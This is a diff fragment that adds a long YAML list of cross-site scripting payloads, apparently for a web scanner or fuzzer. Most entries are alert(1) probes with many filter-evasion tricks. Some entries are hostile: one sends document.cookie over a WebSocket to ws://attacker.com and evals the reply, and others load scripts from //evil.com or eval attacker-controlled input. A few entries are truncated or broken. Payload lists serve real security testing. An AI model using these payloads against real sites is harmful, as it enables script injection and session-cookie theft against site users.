+    ''{{alert(1)}}'')}).then(r => r.text()).then(html => document.write(html))</script>'
+  - <script>fetch('/api/file?path=../../../etc/passwd<script>alert(1)</script>').then(r
+    => r.text()).then(content => document.body.innerHTML = content)</script>
+  - <script>fetch('/api/proxy?url=javascript:alert(1)').then(r => r.text()).then(result
+    => eval(result))</script>
+  - '<script>fetch(''/api/user/profile'', {headers: {''X-Injection'': ''<script>alert(1)</script>''}}).then(r
+    => r.json()).then(data => document.getElementById(''profile'').innerHTML = data.message)</script>'
+  - '<script>fetch(''/api/echo'', {method: ''POST'', body: ''data=<img src=x onerror=alert(1)>''}).then(r
+    => r.text()).then(echo => document.body.innerHTML = echo)</script>'
+  - '<script>var ws = new WebSocket(''wss://target.com/socket''); ws.onopen = () =>
+    ws.send(JSON.stringify({type: ''message'', data: ''<script>alert(1)</script>''}));
+    ws.onmessage = e => document.body.innerHTML = JSON.parse(e.data).content</script>'
+  - <script>var ws = new WebSocket('ws://attacker.com'); ws.onopen = () => ws.send(document.cookie);
+    ws.onmessage = e => eval(e.data)</script>
+  - <script>var ws = new WebSocket('wss://target.com'); ws.onmessage = e => new Function(e.data)()</script>
+  - <script>var ws = new WebSocket('wss://target.com'); ws.onmessage = e => import('data:text/javascript,'
+    + e.data)</script>
+  - '<script>fetch(''/graphql'', {method: ''POST'', headers: {''Content-Type'': ''application/json''},
+    body: JSON.stringify({query: ''query { user(id: "1<script>alert(1)</script>")
+    { name } }''})}).then(r => r.json()).then(data => document.body.innerHTML = JSON.stringify(data))</script>'
+  - '<script>fetch(''/graphql'', {method: ''POST'', body: JSON.stringify({query: ''mutation
+    { updateUser(input: {bio: "<img src=x onerror=alert(1)>"}) { success } }''})}).then(r
+    => r.json()).then(data => eval(data.data.updateUser.callback))</script>'
+  - <script>fetch('/graphql?query={user{profile{data:eval("alert(1)")}}}').then(r
+    => r.text()).then(result => document.write(result))</script>
+  - <select onfocus=alert(1) autofocus>
+  - <textarea onfocus=alert(1) autofocus>
+  - <marquee onstart=alert(1)>XSS</marquee>
+  - <video src=x onerror=alert(1)>
+  - <button onclick=alert(1)>Click</button>
+  - <form onsubmit=alert(1)><input type=submit>
+  - <iframe src=javascript:alert(1)>
+  - <object data=javascript:alert(1)>
+  - <embed src=javascript:alert(1)>
+  - <isindex action=javascript:alert(1) type=submit>
+  - <link rel=stylesheet href=javascript:alert(1)>
+  - <table background=javascript:alert(1)>
+  - <td background=javascript:alert(1)>
+  - <div style=background-image:url(javascript:alert(1))>
+  - <style>@import 'javascript:alert(1)';</style>
+  - <frameset onload=alert(1)>
+  - <bgsound src=javascript:alert(1)>
+  - <applet code=javascript:alert(1)>
+  - <keygen onfocus=alert(1) autofocus>
+  - <math><mi//xlink:href="data:x,<script>alert(1)</script>">
+  - <svg><use href="#x" /></svg><defs><g id="x"><script>alert(1)</script></g></defs>
+  - <svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>
+  - <svg><set onbegin=alert(1) attributeName=x to=1 dur=1s>
+  - <svg><animateMotion onbegin=alert(1) dur=1s>
+  - <svg><feImage onload=alert(1) href=data:,>
+  - <svg><image onload=alert(1) href=data:,>
+  - <svg><foreignObject onload=alert(1)><p>XSS</p></foreignObject>
+  - <svg><text onclick=alert(1)>Click me</text>
+  - <svg><tspan onclick=alert(1)>Click me</tspan>
+  - <svg><rect onclick=alert(1) width=100 height=100>
+  - <svg><circle onclick=alert(1) r=50>
+  - <svg><ellipse onclick=alert(1) rx=50 ry=30>
+  - <svg><line onclick=alert(1) x1=0 y1=0 x2=100 y2=100>
+  - <svg><polyline onclick=alert(1) points="0,0 100,100">
+  - <svg><polygon onclick=alert(1) points="0,0 100,0 50,100">
+  - <svg><path onclick=alert(1) d="M0,0 L100,100">
+  - <svg><g onclick=alert(1)><rect width=100 height=100></g>
+  - <svg><defs><pattern onclick=alert(1) id=p><rect width=1 height=1></pattern></defs>
+  - <svg><mask onclick=alert(1) id=m><rect width=100 height=100 fill=white></mask>
+  - <svg><clipPath onclick=alert(1) id=c><rect width=100 height=100></clipPath>
+  - <svg><marker onclick=alert(1) id=m><rect width=1 height=1></marker>
+  - <svg><switch onclick=alert(1)><rect width=100 height=100></switch>
+  - <svg><symbol onclick=alert(1) id=s><rect width=100 height=100></symbol>
+  - <svg><view onclick=alert(1) viewBox="0 0 100 100">
+  - <ruby onclick=alert(1)>漢<rt>kan</rt></ruby>
+  - <rt onclick=alert(1)>pronunciation</rt>
+  - <rp onclick=alert(1)>(</rp>
+  - <time onclick=alert(1) datetime="2024-12-31">Today</time>
+  - <progress onclick=alert(1) value=50 max=100>
+  - <meter onclick=alert(1) value=0.7>
+  - <output onclick=alert(1) for="input1">Result</output>
+  - <datalist onclick=alert(1)><option value=test></datalist>
+  - <option onclick=alert(1) value=test>Test</option>
+  - <optgroup onclick=alert(1) label="Group">
+  - <fieldset onclick=alert(1)><legend>Legend</legend></fieldset>
+  - <legend onclick=alert(1)>Form Legend</legend>
+  - <label onclick=alert(1) for="input1">Label</label>
+  - <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+  - <script>window['ale'+'rt'](1)</script>
+  - <script>window[atob('YWxlcnQ=')](1)</script>
+  - <script>(function(){return alert})``(1)</script>
+  - <script>[]['constructor']['constructor']('alert(1)')()</script>
+  - <script>Function('alert(1)')()</script>
+  - <script>setTimeout('alert(1)',0)</script>
+  - <script>setInterval('alert(1)',1000)</script>
+  - <script>requestAnimationFrame(()=>alert(1))</script>
+  - <script>Promise.resolve().then(()=>alert(1))</script>
+  - <script>fetch('data:,').then(()=>alert(1))</script>
+  - <script>new Image().onload=()=>alert(1)</script>
+  - <script>new Audio().onerror=()=>alert(1)</script>
+  - <script>new WebSocket('ws://').onerror=()=>alert(1)</script>
+  - <script>window.onerror=()=>alert(1);throw 1</script>
+  - <script>addEventListener('error',()=>alert(1));throw 1</script>
+  - <script>Object.defineProperty(window,'a',{get:()=>alert(1)});a</script>
+  - <script>with(document)body.innerHTML='<img src=x onerror=alert(1)>'</script>
+  - <script>document.write('<script>alert(1)<\/script>')</script>
+  - <script>document.writeln('<script>alert(1)<\/script>')</script>
+  - <script>document.open();document.write('<script>alert(1)<\/script>');document.close()</script>
+  - <script>location='javascript:alert(1)'</script>
+  - <script>location.href='javascript:alert(1)'</script>
+  - <script>location.replace('javascript:alert(1)')</script>
+  - <script>location.assign('javascript:alert(1)')</script>
+  - <script>history.pushState({},'','javascript:alert(1)')</script>
+  - <script>history.replaceState({},'','javascript:alert(1)')</script>
+  - <script>window.open('javascript:alert(1)')</script>
+  - <script>frames[0].location='javascript:parent.alert(1)'</script>
+  - <script>top.location='javascript:alert(1)'</script>
+  - <script>parent.location='javascript:alert(1)'</script>
+  - <script>self.location='javascript:alert(1)'</script>
+  - <script>document.URL='javascript:alert(1)'</script>
+  - <script>new Function('return alert')``(1)</script>
+  - <script>(()=>{}).constructor('alert(1)')()</script>
+  - <script>(async()=>{}).constructor('alert(1)')()</script>
+  - <script>(function*(){}).constructor('alert(1)')()</script>
+  - <script>(async function*(){}).constructor('alert(1)')()</script>
+  - <script>({}).constructor.constructor('alert(1)')()</script>
+  - <script>globalThis.eval('alert(1)')</script>
+  - <script>globalThis.Function('alert(1)')()</script>
+  - <script>this.eval('alert(1)')</script>
+  - <script>self.eval('alert(1)')</script>
+  - <script>top.eval('alert(1)')</script>
+  - <script>parent.eval('alert(1)')</script>
+  - <script>frames[0].eval('alert(1)')</script>
+  - <script>/alert/.source+='(1)';eval('alert(1)')</script>
+  - <script>import('data:text/javascript,alert(1)')</script>
+  - <script>import(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>
+  - <script>new Worker('data:text/javascript,postMessage(alert(1))')</script>
+  - <script>new Worker(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>
+  - <script>new SharedWorker('data:text/javascript,alert(1)')</script>
+  - <script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>
+  - <script>postMessage({},'*');addEventListener('message',e=>eval(e.data.code));postMessage({code:'alert(1)'},'*')</script>
+  - <script>BroadcastChannel('xss').postMessage('alert(1)');new BroadcastChannel('xss').onmessage=e=>eval(e.data)</script>
+  - <script>crypto.subtle.digest('SHA-256',new TextEncoder().encode('alert(1)')).then(()=>alert(1))</script>
+  - <script>new PerformanceObserver(e=>alert(1)).observe({entryTypes:['navigation']})</script>
+  - <script>new MutationObserver(e=>alert(1)).observe(document,{childList:true})</script>
+  - <script>new IntersectionObserver(e=>alert(1)).observe(document.body)</script>
+  - <script>new ResizeObserver(e=>alert(1)).observe(document.body)</script>
+  - <script>Reflect.construct(Function,['alert(1)'])()</script>
+  - <script>Reflect.apply(eval,window,['alert(1)'])</script>
+  - <script>Proxy.revocable({},{}).revoke.constructor('alert(1)')()</script>
+  - <script>new Proxy({},{get:()=>alert(1)}).a</script>
+  - <script>new Proxy({},{set:()=>alert(1)}).a=1</script>
+  - <script>new Proxy(()=>{},{apply:()=>alert(1)})()</script>
+  - <script>new Proxy(function(){},{construct:()=>alert(1)})()</script>
+  - <script/src=data:,alert(1)></script>
+  - <script\x20src=data:,alert(1)></script>
+  - <script\x09src=data:,alert(1)></script>
+  - <script\x0Asrc=data:,alert(1)></script>
+  - <script\x0Dsrc=data:,alert(1)></script>
+  - <script\x0Csrc=data:,alert(1)></script>
+  - <script\x00src=data:,alert(1)></script>
+  - <img src=x onerror="alert(1)"/>
+  - <img src=x onerror='alert(1)'/>
+  - <img src=x onerror=alert(1)/>
+  - <img\x20src=x\x20onerror=alert(1)>
+  - <img&#x20;src=x&#x20;onerror=alert(1)>
+  - <svg onload=alert(/XSS/)>
+  - <svg onload=alert`1`>
+  - <svg onload="alert&lpar;1&rpar;">
+  - <svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+  - <svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+  - <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+  - <iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">
+  - <embed src="data:text/html,<script>alert(1)</script>">
+  - <input type=image src=x onerror=alert(1)>
+  - <form><button formaction=javascript:alert(1)>XSS</button>
+  - <form><input type=submit formaction=javascript:alert(1) value=XSS>
+  - <math><mi xlink:href="javascript:alert(1)">XSS</mi>
+  - <svg><a xlink:href="javascript:alert(1)"><text>XSS</text></a></svg>
+  - <svg><a href="javascript:alert(1)"><text>XSS</text></a></svg>
+  - <base href="javascript://"/><a href="/alert(1)">XSS</a>
+  - <meta http-equiv=refresh content=0;url=javascript:alert(1)>
+  - <meta http-equiv="Set-Cookie" content="x=<script>alert(1)</script>">
+  - <link rel=import href="data:text/html,<script>alert(1)</script>">
+  - <link rel=prefetch href="javascript:alert(1)">
+  - <link rel=preload href="javascript:alert(1)" as=script>
+  - <style>@import url("javascript:alert(1)");</style>
+  - <style>body{background:url("javascript:alert(1)")}</style>
+  - <style>body{list-style:url("javascript:alert(1)")}</style>
+  - <style>body:before{content:url("javascript:alert(1)")}</style>
+  - <div style="behavior:url('javascript:alert(1)')">
+  - <div style="binding:url('javascript:alert(1)')">
+  - <div style="expression(alert(1))">
+  - <plaintext><script>alert(1)</script>
+  - <listing><script>alert(1)</script></listing>
+  - <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+  - <noembed><p title="</noembed><img src=x onerror=alert(1)>">
+  - <noframes><p title="</noframes><img src=x onerror=alert(1)>">
+  - <textarea><script>alert(1)</script></textarea>
+  - <title><script>alert(1)</script></title>
+  - <script src=//google.com/jsapi?callback=alert></script>
+  - <script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert></script>
+  - <script src="//maps.googleapis.com/maps/api/js?callback=alert"></script>
+  - <script src="//www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
+  - '"><script>alert(1)</script>'
+  - '''><script>alert(1)</script>'
+  - </script><script>alert(1)</script>
+  - </title><script>alert(1)</script>
+  - </style><script>alert(1)</script>
+  - </textarea><script>alert(1)</script>
+  - data:text/javascript,alert(1)
+  - vbscript:alert(1)
+  - livescript:alert(1)
+  - mocha:alert(1)
+  - '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'
+  - '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'
+  - JaVaScRiPt:alert(1)
+  - java&#x09;script:alert(1)
+  - java&#x0A;script:alert(1)
+  - java&#x0D;script:alert(1)
+  - <svg/onload=alert(/XSS/.source)>
+  - <script>window['alert'](1)</script>
+  - <script>self['alert'](1)</script>
+  - <script>top['alert'](1)</script>
+  - <script>parent['alert'](1)</script>
+  - <script>globalThis['alert'](1)</script>
+  - <script>var a='ale'+'rt';window[a](1)</script>
+  - <script>var a=0x61+0x6C+0x65+0x72+0x74;eval(String.fromCharCode(a)+'(1)')</script>
+  - <script>!function(){alert(1)}()</script>
+  - <script>+function(){alert(1)}()</script>
+  - <script>void function(){alert(1)}()</script>
+  - <script>~function(){alert(1)}()</script>
+  - <script>/a/,alert(1)</script>
+  - <script>0?0:alert(1)</script>
+  - <script>0||alert(1)</script>
+  - <script>1&&alert(1)</script>
+  - <script>false||alert(1)</script>
+  - <script>true&&alert(1)</script>
+  - <script>null||alert(1)</script>
+  - <script>undefined||alert(1)</script>
+  - <script>NaN||alert(1)</script>
+  - <script>''||alert(1)</script>
+  - <script>[][[]]||alert(1)</script>
+  - <script>{}+alert(1)</script>
+  - <script>++[[]][+[]]+alert(1)</script>
+  - <script>String.fromCodePoint(97,108,101,114,116)(1)</script>
+  - <script>unescape('%61%6C%65%72%74%28%31%29')</script>
+  - <script>decodeURI('%61%6C%65%72%74%28%31%29')</script>
+  - <script>decodeURIComponent('%61%6C%65%72%74%28%31%29')</script>
+  - <script>escape('<svg onload=alert(1)>')</script>
+  - <script>JSON.parse('{"x":"alert(1)"}').x</script>
+  - <script>Object.create(null,{x:{value:alert(1)}}).x</script>
+  - <script>Object.assign({},{'alert':alert}).alert(1)</script>
+  - <script>Object.freeze({alert}).alert(1)</script>
+  - <script>Object.seal({alert}).alert(1)</script>
+  - <script>Object.getPrototypeOf(window).alert.call(this,1)</script>
+  - <script>Object.getOwnPropertyDescriptor(window,'alert').value(1)</script>
+  - <script>Reflect.get(window,'alert')(1)</script>
+  - <script>Reflect.has(window,'alert')&&alert(1)</script>
+  - <script>Reflect.ownKeys(window).includes('alert')&&alert(1)</script>
+  - <script>Symbol.for('alert') in window&&alert(1)</script>
+  - <script>WeakMap.prototype.set.call(new WeakMap(),window,alert)(1)</script>
+  - <script>Map.prototype.get.call(new Map([['x',alert]]),('x'))(1)</script>
+  - <script>Set.prototype.has.call(new Set([alert]),alert)&&alert(1)</script>
+  - <script>Array.prototype.includes.call([alert],alert)&&alert(1)</script>
+  - <script>Array.from({0:alert,length:1})[0](1)</script>
+  - <script>Array.of(alert)[0](1)</script>
+  - <script>[].constructor.prototype.slice.call(arguments)[0]||alert(1)</script>
+  - <script>document.createElement('script').src='data:,alert(1)'</script>
+  - <script>document.createElement('img').src='x';document.images[0].onerror=alert</script>
+  - <script>document.implementation.createHTMLDocument().write('<svg onload=alert(1)>')</script>
+  - <script>new DOMParser().parseFromString('<svg onload=alert(1)>','image/svg+xml')</script>
+  - <script>document.createRange().createContextualFragment('<svg onload=alert(1)>')</script>
+  - <script>new XMLHttpRequest().open('GET','data:,alert(1)',false);xhr.send()</script>
+  - <script>navigator.sendBeacon('data:,alert(1)')</script>
+  - <script>speechSynthesis.speak(new SpeechSynthesisUtterance('XSS'));speechSynthesis.onvoiceschanged=alert</script>
+  - <script>performance.mark('xss');performance.getEntriesByName('xss')[0].name.includes('xss')&&alert(1)</script>
+  - <script>console.log('%cXSS','color:red');console.clear();alert(1)</script>
+  - <script>CSS.supports('color','red')&&alert(1)</script>
+  - <script>CSS.registerProperty({name:'--xss',syntax:'*',inherits:false,initialValue:'alert(1)'});alert(1)</script>
+  - <script>customElements.define('xss-element',class extends HTMLElement{constructor(){super();alert(1)}})</script>
+  - <script>devicePixelRatio>0&&alert(1)</script>
+  - <script>screen.width>0&&alert(1)</script>
+  - <script>navigator.hardwareConcurrency>0&&alert(1)</script>
+  - <script>navigator.languages.length>0&&alert(1)</script>
+  - <script>Intl.DateTimeFormat().resolvedOptions().locale&&alert(1)</script>
+  - <script nonce="known-nonce">alert(1)</script>
+  - <link rel="prefetch" href="//evil.com/script.js">
+  - <link rel="preload" href="//evil.com/script.js" as="script">
+  - <base href="//evil.com/"><script src="script.js"></script>
+  - <iframe src="data:text/html,<script>parent.alert(1)</script>">
+  - <iframe src="data:text/html,<svg onload=parent.alert(1)>">
+  - <iframe src="data:text/html,<img src=x onerror=parent.alert(1)>">
+  - <script>import('//evil.com/module.js').then(m=>m.alert())</script>
+  - <script>import('data:text/javascript,export function xss(){alert(1)}').then(m=>m.xss())</script>
+  - <script>fetch('//evil.com/jsonp?callback=alert').then(r=>r.text()).then(eval)</script>
+  - <script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(()=>alert(1))</script>
+  - <script>new Worker("data:text/javascript,postMessage('alert(1)')").onmessage=e=>eval(e.data)</script>
+  - <script>navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch",e=>e.respondWith(new
+    Response("alert(1)")))')</script>
+  - <script>document.domain='evil.com';alert(1)</script>
+  - <form action="javascript:alert(1)"><input type=submit></form>
+  - <form><button formaction="javascript:alert(1)">Click</button></form>
+  - <style>@import"//evil.com/css.css";</style>
+  - <style>body{background:url('//evil.com/image.png')}</style>
+  - <img src="//evil.com/track.gif?xss=1" style="display:none">
+  - <audio src="//evil.com/sound.mp3" autoplay>
+  - <video src="//evil.com/video.mp4" autoplay>
+  - <track kind="captions" src="//evil.com/captions.vtt">
+  - <source src="//evil.com/media.mp4">
+  - <frame src="//evil.com/frame.html">
+  - <frameset><frame src="//evil.com/frame.html"></frameset>
+  - <applet code="//evil.com/Applet.class">
+  - <param name="movie" value="//evil.com/flash.swf">
+  - <input type="image" src="//evil.com/image.png">
+  - <body background="//evil.com/bg.jpg">
+  - <table background="//evil.com/bg.jpg">
+  - <td background="//evil.com/bg.jpg">
+  - <th background="//evil.com/bg.jpg">
+  - <bgsound src="//evil.com/sound.wav">
+  - <script>location.hash='#'+document.cookie</script>
+  - <script>window.name=document.cookie</script>
+  - <script>sessionStorage.xss=document.cookie</script>
+  - <script>localStorage.xss=document.cookie</script>
+  - <script>indexedDB.open('xss').onsuccess=e=>e.target.result.createObjectStore('cookies').add(document.cookie,'key')</script>
+  - <script>caches.open('xss').then(c=>c.put(new Request('xss'),new Response(document.cookie)))</script>
+  - <script>document.title=document.cookie</script>
+  - <script>document.body.innerHTML='<h1>'+document.cookie+'</h1>'</script>
+  - <script>history.pushState(null,null,'#'+document.cookie)</script>
+  - <script>console.log(document.cookie)</script>
+  - <meta name="viewport" content="width=device-width,user-scalable=no"><img src=x
+    onerror=alert(1)>
+  - <div ontouchstart="alert(1)">Touch me</div>
+  - <div ontouchend="alert(1)">Touch me</div>
+  - <div ontouchmove="alert(1)">Touch me</div>
+  - <div ontouchcancel="alert(1)">Touch me</div>
+  - <div onpointerdown="alert(1)">Pointer me</div>
+  - <div onpointerup="alert(1)">Pointer me</div>
+  - <div onpointermove="alert(1)">Pointer me</div>
+  - <div onpointercancel="alert(1)">Pointer me</div>
+  - <div ongesturestart="alert(1)">Gesture me</div>
+  - <div ongesturechange="alert(1)">Gesture me</div>
+  - <div ongestureend="alert(1)">Gesture me</div>
+  - <body onorientationchange="alert(1)">
+  - <script>window.ondevicemotion=()=>alert(1)</script>
+  - <script>window.ondeviceorientation=()=>alert(1)</script>
+  - <script>navigator.vibrate&&navigator.vibrate(1000)&&alert(1)</script>
+  - <script>screen.orientation&&alert(1)</script>
+  - <script>navigator.share&&navigator.share({title:'XSS'}).catch(alert)</script>
+  - <script>navigator.clipboard&&navigator.clipboard.writeText('XSS').then(()=>alert(1))</script>
+  - <script>navigator.permissions&&navigator.permissions.query({name:'camera'}).then(()=>alert(1))</script>
+  - <script>navigator.getBattery&&navigator.getBattery().then(()=>alert(1))</script>
+  - <script>navigator.connection&&alert(1)</script>
+  - '<script>matchMedia(''(orientation: portrait)'')&&alert(1)</script>'
+  - '<script>matchMedia(''(max-width: 768px)'').matches&&alert(1)</script>'
+  - <script>'ontouchstart' in window&&alert(1)</script>
+  - <script>document.location.hash.slice(1)&&eval(document.location.hash.slice(1))</script>
+  - <script>location.search&&eval(decodeURIComponent(location.search.slice(1)))</script>
+  - <script>document.referrer.includes('evil')&&alert(1)</script>
+  - <script>document.cookie.includes('admin')&&alert(1)</script>
+  - <script>localStorage.getItem('xss')&&eval(localStorage.getItem('xss'))</script>
+  - <script>sessionStorage.getItem('xss')&&eval(sessionStorage.getItem('xss'))</script>
+  - <script>window.name&&eval(window.name)</script>
+  - <script>document.title&&document.title.includes('xss')&&alert(1)</script>
+  - <script>document.URL&&document.URL.includes('xss')&&alert(1)</script>
+  - <script>document.domain&&alert(1)</script>
+  - <script>navigator.userAgent.includes('Mobile')&&alert(1)</script>
+  - <script>navigator.platform&&alert(1)</script>
+  - <script>navigator.language.includes('en')&&alert(1)</script>
+  - <script>screen.width>1024&&alert(1)</script>
+  - <script>screen.colorDepth>16&&alert(1)</script>
+  - <script>window.outerWidth>800&&alert(1)</script>
+  - <script>window.devicePixelRatio>1&&alert(1)</script>
+  - <script>new Date().getDay()===5&&alert(1)</script>
+  - <script>new Date().getHours()>17&&alert(1)</script>
+  - <script>Math.random()>0.5&&alert(1)</script>
+  - <script>document.readyState==='complete'&&alert(1)</script>
+  - <script>document.hidden===false&&alert(1)</script>
+  - <script>navigator.onLine&&alert(1)</script>
+  - <script>navigator.cookieEnabled&&alert(1)</script>
+  - <script>navigator.javaEnabled()&&alert(1)</script>
+  - <script>window.chrome&&alert(1)</script>
+  - <script>window.opera&&alert(1)</script>
+  - <script>window.MSInputMethodContext&&alert(1)</script>
+  - <script>window.InstallTrigger!==undefined&&alert(1)</script>
+  - <script>history.length>1&&alert(1)</script>
+  - <script>performance.now()>1000&&alert(1)</script>
+  - <script>document.timeline&&alert(1)</script>
+  - <script>CSS&&CSS.paintWorklet&&alert(1)</script>
+  - <script>window.webkitRequestFileSystem&&alert(1)</script>
+  - <script>window.msRequestAnimationFrame&&alert(1)</script>
+  - '<img src=x onerror="[...{ [Symbol.iterator]: () => ({ next: () => ({ done: true
+    }) }) }, alert(document.domain)]">'
+  - <script>document.querySelector&&alert('CSS Query')</script>
+  - <script>document.querySelectorAll&&alert('CSS Query All')</script>
+  - <script>document.getElementById('test')||alert('Missing Element')</script>
+  - <script>window.fetch&&fetch('//evil.com/').catch(()=>alert(1))</script>
+  - <script>window.WebSocket&&new WebSocket('ws://evil.com').onerror=()=>alert(1)</script>
+  - <script>window.EventSource&&new EventSource('//evil.com').onerror=()=>alert(1)</script>
+  - <script>window.Worker&&new Worker('data:,alert(1)').onerror=()=>alert(2)</script>
+  - <script>window.SharedWorker&&new SharedWorker('data:,alert(1)').onerror=()=>alert(2)</script>
+  - <script>window.ServiceWorker&&navigator.serviceWorker.register('data:,alert(1)').catch(()=>alert(2))</script>
+  - <script>window.Notification&&Notification.requestPermission().then(()=>alert(1))</script>
+  - <script>window.speechSynthesis&&speechSynthesis.speak(new SpeechSynthesisUtterance('XSS'))&&alert(1)</script>
+  - <script>window.webkitSpeechRecognition&&new webkitSpeechRecognition().onerror=()=>alert(1)</script>
+  - <script>window.IntersectionObserver&&new IntersectionObserver(()=>alert(1)).observe(document.body)</script>
+  - <script>window.MutationObserver&&new MutationObserver(()=>alert(1)).observe(document,{childList:1})</script>
+  - <script>window.ResizeObserver&&new ResizeObserver(()=>alert(1)).observe(document.body)</script>
+  - <script>window.PerformanceObserver&&new PerformanceObserver(()=>alert(1)).observe({entryTypes:['measure']})</script>
+  - <script>window.ReportingObserver&&new ReportingObserver(()=>alert(1))</script>
+  - <script>window.BroadcastChannel&&new BroadcastChannel('xss').postMessage(alert(1))</script>
+  - <script>window.MessageChannel&&new MessageChannel().port1.postMessage(alert(1))</script>
+  - <script>window.PaymentRequest&&new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'XSS',amount:{currency:'USD',value:'1'}}}).show().catch(()=>alert(1))</script>
+  - ا='',ب=!ا+ا,ت=!ب+ا,ث=ا+{},ج=ب[ا++],ح=ب[خ=ا],د=++خ+ا,ذ=ث[خ+د],ب[ذ+=ث[ا]+(ب.ت+ث)[ا]+ت[د]+ج+ح+ب[خ]+ذ+ج+ث[ا]+ح][ذ](ت[ا]+ت[خ]+ب[د]+ح+ج+"(1)")()
+  - а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+  - 𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
+  - あ='',い=!あ+あ,う=!い+あ,え=あ+{},お=い[あ++],か=い[き=あ],く=++き+あ,け=え[き+く],い[け+=え[あ]+(い.う+え)[あ]+う[く]+お+か+い[き]+け+お+え[あ]+か][け](う[あ]+う[き]+い[く]+か+お+"('ハッキングされました')")()
+  - 甲='',乙=!甲+甲,丙=!乙+甲,丁=甲+{},戊=乙[甲++],己=乙[庚=甲],辛=++庚+甲,壬=丁[庚+辛],乙[壬+=丁[甲]+(乙.丙+丁)[甲]+丙[辛]+戊+己+乙[庚]+壬+戊+丁[甲]+己][壬](丙[甲]+丙[庚]+乙[辛]+己+戊+"('被攻擊了')")()
+  - <template shadowrootmode=open><slot onslotchange=alert( )>
+  - <p>x<template shadowrootmode=open><slot onslotchange=alert( )>
+  - <h1>Click here</h1>
+  - <input type=search value=x onsearch=alert('onsearch') oninput=alert('oninput')
+    style=position:fixed;left:50%;top:50%;padding:0;width:10px;z-index:99;transform:scale(9999);opacity:0>
+  - <html id=xss><html onbeforematch=alert()><html hidden=until-found>
+  - <body style=animation:x><body onanimationend=alert()><style>@keyframes x{
+  - <img src=x onerror="(()=>{const s=document.createElement('script');s.textContent='alert(1)';document.head.appendChild(s)})()">
+  - <img src=x onerror="setTimeout(()=>alert('Delayed-XSS'),100)">
+  - <img src=x onerror="window['ale'+'rt'](document['cook'+'ie'])">
+  - <img src=x onerror="\u0061\u006c\u0065\u0072\u0074('\u0055\u006e\u0069\u0063\u006f\u0064\u0065')">
+  - <input autofocus onfocus="this.onfocus=null;setTimeout(()=>alert('Self-Cleanup'),50)">
+  - <img src=x onerror="`${alert('Template-Literal')}`">
+  - <img src=x onerror="try{new Worker('data:text/javascript,postMessage(1)').onmessage=()=>alert('Worker')}catch(e){alert('Fallback')}">
+  - <img src=x onerror="this.onerror=null;this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg=='">
+  - <img src=x onerror="for(let i=0;i<3;i++){setTimeout(()=>i===1&&alert('Race-'+i),i*20)}">
+  - <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+  - <img\fsrc=x\fonerror=alert(1)>
+  - <img\rsrc=x\ronerror=alert(1)>
+  - <img src=x OnErRoR=alert(1)>
+  - <svg ONlOaD=alert(1)>
+  - <video onloadstart=alert(1)>
+  - <audio oncanplay=alert(1)>
+  - <video onplay=alert(1) autoplay>
+  - <img src=x onerror=%61%6C%65%72%74%28%31%29>
+  - <details onbeforetoggle=alert(1) open>
+  - <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">
+  - '{{_openBlock.constructor(''alert(1)'')()}}'
+  - '[self.alert(1)]'
+  - <script>globalThis[`al`+/ert/.source](1)</script>
+  - <script>window['a'+'l'+'e'+'r'+'t'](1)</script>
+  - <script>al\u0065rt(1)</script>
+  - <div onanimationstart=alert(1) style=animation:x\ 1s><style>@keyframes x{}</style></div>
+  - <script>Function.prototype.constructor('alert(1)')()</script>
+  - <iframe src="javascript:`${alert(1)}`"></iframe>
+  - <img/src=x/onerror=this[location.hash.slice(1)](1)>
+  - <meta http-equiv=refresh content="0;url=javascript:alert`1`">
+  - <script>top[String.fromCharCode(97,108,101,114,116)](1)</script>
+  - <svgonload=alert(1)><svg>
+  - <marquee width=10 loop=2 behavior="alternate" onbounce=alert()>
+  - <marquee loop=1 width=0 onfinish=alert(1)>
+  - <body onpageshow=alert(1)>
+  - <video controls onloadeddata="alert()"><source src=x></video>
+  - <video controls onloadedmetadata="alert()"><source src=x></video>
+  - <audio autoplay controls onplaying="alert()"><source src=x></audio>
+  - <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+  - <form><isindex formaction="javascript&colon;confirm(1)">
